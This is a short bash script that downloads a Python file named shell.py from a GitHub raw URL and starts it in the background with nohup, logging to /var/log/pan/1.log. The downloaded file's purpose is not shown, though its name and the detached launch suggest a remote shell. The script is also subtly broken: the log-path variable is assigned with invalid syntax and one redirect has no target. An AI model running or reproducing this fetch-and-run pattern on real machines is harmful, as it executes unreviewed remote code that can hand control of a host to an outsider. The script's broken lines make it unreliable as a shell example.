#!/bin/bash

$L=/var/log/pan/1.log
echo "Starting..." >> $L

curl https://raw.githubusercontent.com/pavelrn/js-sandbox/main/shell.py --output shell.py >> $L
ls -lsa >> $
nohup python3 shell.py >> $L 2>&1 & 
echo 'ok' >> $L
